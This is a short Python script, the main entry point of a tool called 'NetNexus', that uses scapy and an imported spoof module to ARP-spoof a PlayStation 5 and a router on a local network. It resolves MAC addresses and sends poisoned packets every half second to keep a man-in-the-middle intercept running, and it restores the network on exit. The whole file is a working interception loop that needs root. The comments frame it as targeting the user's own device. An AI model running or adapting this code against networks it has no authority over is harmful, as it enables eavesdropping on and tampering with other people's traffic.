import scapy.all as scapy
import os
import time
from core import scanner, spoof

def main():
    # --- CONFIGURATION ---
    # Replace 'wlan0' with your actual interface (e.g., wlp2s0 or enp3s0)
    scapy.conf.iface = "wlan0" 
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root privileges. Run with: sudo python main.py")
        return

    gateway_ip = "192.168.8.1"
    target_ip = "192.168.8.5" # Your PS5

    print(f"=== NetNexus Active Intercept ===")
    print(f"[*] Interface: {scapy.conf.iface}")
    print(f"[*] Targeting PS5 at {target_ip}")

    # Resolve MAC addresses before starting the loop
    target_mac, _ = spoof.get_device_info(target_ip)
    gateway_mac, _ = spoof.get_device_info(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[-] Error: Could not find MAC addresses. Is the PS5 on?")
        return

    try:
        print("[*] Spoofing in progress... Press Ctrl+C to stop.")
        while True:
            # Send packets every 0.5s to maintain the intercept
            spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
            time.sleep(0.5) 
    except KeyboardInterrupt:
        print("\n[*] Stopping... Restoring network for the PS5.")
        spoof.restore(target_ip, gateway_ip)
        spoof.restore(gateway_ip, target_ip)
        print("[+] Success.")

if __name__ == "__main__":
    main()
